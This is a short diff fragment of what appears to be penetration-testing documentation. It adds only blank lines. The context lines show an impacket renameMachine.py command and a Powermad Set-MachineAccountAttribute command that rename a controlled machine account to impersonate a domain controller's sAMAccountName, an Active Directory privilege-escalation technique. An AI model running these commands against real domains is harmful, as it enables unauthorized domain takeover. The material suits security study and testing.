@@ -17,3 +17,5 @@ impacket@linux> renameMachine.py -current-name 'ControlledComputer$' -new-name '
 
 powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose
 ```
+
+
